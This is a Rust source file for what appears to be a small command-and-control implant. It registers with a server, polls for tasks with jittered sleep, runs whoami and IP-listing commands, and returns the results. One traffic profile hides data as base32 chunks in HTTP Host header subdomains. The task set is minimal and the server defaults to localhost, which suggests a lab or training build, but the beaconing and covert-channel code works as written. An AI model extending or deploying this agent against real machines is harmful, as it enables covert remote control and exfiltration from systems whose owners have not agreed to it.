use rand::RngCore;
use reqwest::blocking::Client as HttpClient;
use reqwest::header::{CONTENT_TYPE, HOST};
use serde::{Deserialize, Serialize};
use serde_json::{json, Value};
use std::collections::HashMap;
use std::env;
use std::fs;
use std::process::Command;
use std::thread;
use std::time::Duration;

#[derive(Clone, Deserialize, Serialize)]
struct Rule {
    method: String,
    transport: String,
    field: String,
}

#[derive(Deserialize, Serialize)]
struct Config {
    payload_uuid: String,
    profile: HashMap<String, Rule>,
    #[serde(default)]
    server_url: String,
}

#[derive(Clone, Deserialize)]
struct Task {
    task_id: i64,
    command: String,
}

#[derive(Debug)]
enum ClientError {
    Status(u16, String),
    Other(String),
}
impl std::fmt::Display for ClientError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::Status(code, text) => write!(f, "HTTP {code}: {text}"),
            Self::Other(text) => write!(f, "{text}"),
        }
    }
}
type Result<T> = std::result::Result<T, ClientError>;
fn other(error: impl std::fmt::Display) -> ClientError {
    ClientError::Other(error.to_string())
}
fn env_or(name: &str, fallback: &str) -> String {
    env::var(name)
        .ok()
        .filter(|s| !s.is_empty())
        .unwrap_or_else(|| fallback.to_owned())
}

fn send(
    http: &HttpClient,
    method: &str,
    endpoint: &str,
    transport: &str,
    field: &str,
    value: &Value,
    payload: &str,
    host: &str,
    server: &str,
) -> Result<Value> {
    let mut address = format!("{}/{}", server.trim_end_matches('/'), endpoint);
    let mut request = http.request(method.parse().map_err(other)?, &address);
    if !payload.is_empty() {
        request = request.header("X-Payload-UUID", payload);
    }
    match transport {
        "json" => {
            let mut object = serde_json::Map::new();
            object.insert(field.to_owned(), value.clone());
            request = request.json(&Value::Object(object));
        }
        "query" | "form" => {
            let text = value
                .as_str()
                .map(str::to_owned)
                .unwrap_or_else(|| value.to_string());
            let encoded = form_urlencoded::Serializer::new(String::new())
                .append_pair(field, &text)
                .finish();
            if transport == "query" {
                address.push('?');
                address.push_str(&encoded);
                request = http.request(method.parse().map_err(other)?, &address);
                if !payload.is_empty() {
                    request = request.header("X-Payload-UUID", payload);
                }
            } else {
                request = request
                    .header(CONTENT_TYPE, "application/x-www-form-urlencoded")
                    .body(encoded);
            }
        }
        "host" => request = request.header(HOST, host),
        _ => return Err(other("Unknown transport")),
    }
    let response = request.send().map_err(other)?;
    let code = response.status().as_u16();
    let text = response.text().map_err(other)?;
    if !(200..300).contains(&code) {
        return Err(ClientError::Status(code, text));
    }
    serde_json::from_str(&text).map_err(other)
}

fn base32(bytes: &[u8]) -> String {
    const ALPHABET: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
    let mut result = String::new();
    let mut buffer = 0u32;
    let mut bits = 0;
    for byte in bytes {
        buffer = (buffer << 8) | *byte as u32;
        bits += 8;
        while bits >= 5 {
            bits -= 5;
            result.push(ALPHABET[((buffer >> bits) & 31) as usize] as char);
            buffer &= (1 << bits) - 1;
        }
    }
    if bits > 0 {
        result.push(ALPHABET[((buffer << (5 - bits)) & 31) as usize] as char);
    }
    result
}

fn profile_request(
    http: &HttpClient,
    endpoint: &str,
    operation: &str,
    value: Value,
    config: &Config,
) -> Result<Value> {
    let rule = config
        .profile
        .get(operation)
        .ok_or_else(|| other("Missing profile rule"))?;
    if rule.transport != "host" {
        return send(
            http,
            &rule.method,
            endpoint,
            &rule.transport,
            &rule.field,
            &value,
            &config.payload_uuid,
            "",
            &config.server_url,
        );
    }
    let text = value
        .as_str()
        .map(str::to_owned)
        .unwrap_or_else(|| value.to_string());
    if text.is_empty() || text.len() > 20000 {
        return Err(other("Host data must be 1..20000 UTF-8 bytes"));
    }
    let encoded = base32(text.as_bytes());
    let count = encoded.len().div_ceil(50);
    let mut random = [0u8; 6];
    rand::thread_rng().fill_bytes(&mut random);
    let id: String = random.iter().map(|byte| format!("{byte:02x}")).collect();
    let mut result = Value::Null;
    for index in 0..count {
        let end = ((index + 1) * 50).min(encoded.len());
        let host = format!(
            "m.{id}.{}.{count}.{}.demo.test",
            index + 1,
            &encoded[index * 50..end]
        );
        result = send(
            http,
            &rule.method,
            endpoint,
            "host",
            &rule.field,
            &value,
            &config.payload_uuid,
            &host,
            &config.server_url,
        )?;
        if index + 1 < count && result.get("received").is_none() {
            return Err(other("Server rejected Host part"));
        }
    }
    Ok(result)
}

fn valid_uuid(text: &str) -> bool {
    let bytes = text.as_bytes();
    bytes.len() == 36
        && bytes.iter().enumerate().all(|(i, b)| {
            if [8, 13, 18, 23].contains(&i) {
                *b == b'-'
            } else {
                b.is_ascii_hexdigit()
            }
        })
}

fn load_config(http: &HttpClient, path: &str, server: &str, profile: &str) -> Result<Config> {
    let config: Config = match fs::read_to_string(path) {
        Ok(data) => {
            let saved: Config = serde_json::from_str(&data).map_err(other)?;
            if saved.server_url != server {
                return Err(other("BOT_SERVER does not match saved config"));
            }
            saved
        }
        Err(error) if error.kind() == std::io::ErrorKind::NotFound => {
            let response = send(
                http,
                "POST",
                "payloads",
                "json",
                "profile",
                &json!(profile),
                "",
                "",
                server,
            )?;
            let mut fresh: Config = serde_json::from_value(response).map_err(other)?;
            fresh.server_url = server.to_owned();
            if let Some(parent) = std::path::Path::new(path).parent() {
                if !parent.as_os_str().is_empty() {
                    fs::create_dir_all(parent).map_err(other)?;
                }
            }
            fs::write(path, serde_json::to_vec_pretty(&fresh).map_err(other)?).map_err(other)?;
            fresh
        }
        Err(error) => return Err(other(error)),
    };
    if !valid_uuid(&config.payload_uuid) {
        return Err(other("Invalid payload UUID"));
    }
    for op in ["checkin", "get_task", "post_task"] {
        let rule = config
            .profile
            .get(op)
            .ok_or_else(|| other(format!("Missing profile rule {op}")))?;
        if !["GET", "POST"].contains(&rule.method.as_str())
            || !["json", "form", "query", "host"].contains(&rule.transport.as_str())
            || rule.field.trim().is_empty()
            || rule.field.len() > 64
            || (rule.method == "GET" && rule.transport != "query" && rule.transport != "host")
        {
            return Err(other(format!("Invalid profile rule {op}")));
        }
    }
    Ok(config)
}

#[cfg(windows)]
fn ip_addresses() -> Result<Vec<String>> {
    use windows_sys::Win32::NetworkManagement::IpHelper::{
        GetAdaptersAddresses, IP_ADAPTER_ADDRESSES_LH,
    };
    use windows_sys::Win32::Networking::WinSock::{getnameinfo, AF_UNSPEC, NI_NUMERICHOST};
    let mut size = 15000u32;
    let mut storage = vec![0u64; (size as usize).div_ceil(8)];
    let mut status = unsafe {
        GetAdaptersAddresses(
            AF_UNSPEC as u32,
            0,
            std::ptr::null(),
            storage.as_mut_ptr() as *mut IP_ADAPTER_ADDRESSES_LH,
            &mut size,
        )
    };
    if status == 111 {
        storage.resize((size as usize).div_ceil(8), 0);
        status = unsafe {
            GetAdaptersAddresses(
                AF_UNSPEC as u32,
                0,
                std::ptr::null(),
                storage.as_mut_ptr() as *mut IP_ADAPTER_ADDRESSES_LH,
                &mut size,
            )
        };
    }
    if status != 0 {
        return Err(other(format!("GetAdaptersAddresses failed: {status}")));
    }
    let mut lines = Vec::new();
    unsafe {
        let mut adapter = storage.as_ptr() as *const IP_ADAPTER_ADDRESSES_LH;
        while !adapter.is_null() {
            let mut length = 0;
            while *(*adapter).FriendlyName.add(length) != 0 {
                length += 1;
            }
            let name = String::from_utf16_lossy(std::slice::from_raw_parts(
                (*adapter).FriendlyName,
                length,
            ));
            let mut address = (*adapter).FirstUnicastAddress;
            while !address.is_null() {
                let socket = (*address).Address;
                let mut node = [0u8; 128];
                if getnameinfo(
                    socket.lpSockaddr,
                    socket.iSockaddrLength,
                    node.as_mut_ptr(),
                    node.len() as u32,
                    std::ptr::null_mut(),
                    0,
                    NI_NUMERICHOST as i32,
                ) == 0
                {
                    let ip = std::ffi::CStr::from_ptr(node.as_ptr() as *const i8).to_string_lossy();
                    lines.push(format!("{name}: {ip}"));
                }
                address = (*address).Next;
            }
            adapter = (*adapter).Next;
        }
    }
    Ok(lines)
}

fn execute(command: &str) -> Result<String> {
    match command {
        "whoami" => {
            let program = env::var("SystemRoot")
                .map(|root| format!("{root}\\System32\\whoami.exe"))
                .unwrap_or_else(|_| "whoami".to_owned());
            let output = Command::new(program).output().map_err(other)?;
            if !output.status.success() {
                return Err(other("whoami failed"));
            }
            Ok(String::from_utf8_lossy(&output.stdout).trim().to_owned())
        }
        "ip" => {
            let lines = ip_addresses()?;
            Ok(if lines.is_empty() {
                "IP адресов не нашёл".to_owned()
            } else {
                lines.join("\n")
            })
        }
        "exit" => Ok("Выхожу".to_owned()),
        _ => Err(other("Unknown command")),
    }
}

fn run() -> Result<()> {
    let server = env_or("BOT_SERVER", "http://127.0.0.1:5000");
    let profile = env_or("BOT_PROFILE", "standard");
    if !["standard", "mixed", "host"].contains(&profile.as_str()) {
        return Err(other("Invalid BOT_PROFILE"));
    }
    let base: f64 = env_or("BOT_SLEEP", "5").parse().map_err(other)?;
    let jitter: f64 = env_or("BOT_JITTER", "0.3")
        .parse::<f64>()
        .map_err(other)?
        .clamp(0.0, 1.0);
    if !base.is_finite() || base <= 0.0 {
        return Err(other("Invalid BOT_SLEEP"));
    }
    let path = env_or("BOT_CONFIG", &format!("payload-{profile}.json"));
    let http = HttpClient::builder()
        .timeout(Duration::from_secs(5))
        .build()
        .map_err(other)?;
    let config = load_config(&http, &path, &server, &profile)?;
    println!("Config: {path} Payload: {}", config.payload_uuid);
    let response = profile_request(
        &http,
        "checkin",
        "checkin",
        json!(config.payload_uuid),
        &config,
    )?;
    let callback = response
        .get("callback_uuid")
        .and_then(Value::as_str)
        .ok_or_else(|| other("Missing callback UUID"))?
        .to_owned();
    if !valid_uuid(&callback) {
        return Err(other("Invalid callback UUID"));
    }
    println!("Callback: {callback}");
    let mut pending: Option<(Task, String)> = None;
    loop {
        let work = (|| -> Result<bool> {
            if pending.is_none() {
                let response =
                    profile_request(&http, "poll", "get_task", json!(callback), &config)?;
                if let Some(task_value) = response.get("task").filter(|value| !value.is_null()) {
                    let task: Task = serde_json::from_value(task_value.clone()).map_err(other)?;
                    println!("Task: {} {}", task.task_id, task.command);
                    let mut result =
                        execute(&task.command).unwrap_or_else(|error| format!("Ошибка: {error}"));
                    if result.chars().count() > 20000 {
                        result = result.chars().take(20000).collect();
                    }
                    pending = Some((task, result));
                }
            }
            if let Some((task, result)) = &pending {
                profile_request(
                    &http,
                    "results",
                    "post_task",
                    json!({"callback_uuid": callback, "task_id": task.task_id, "result": result}),
                    &config,
                )?;
                println!("Result sent: {}", task.task_id);
                if task.command == "exit" {
                    return Ok(true);
                }
                pending = None;
            }
            Ok(false)
        })();
        match work {
            Ok(true) => return Ok(()),
            Err(ClientError::Status(code, body)) if (400..500).contains(&code) => {
                return Err(ClientError::Status(code, body))
            }
            Err(error) => eprintln!("Connection failed, retrying: {error}"),
            _ => {}
        }
        let factor = 1.0 + rand::random::<f64>() * 2.0 * jitter - jitter;
        thread::sleep(Duration::from_secs_f64((base * factor).max(0.1)));
    }
}

fn main() {
    if let Err(error) = run() {
        eprintln!("{error}");
        std::process::exit(1);
    }
}
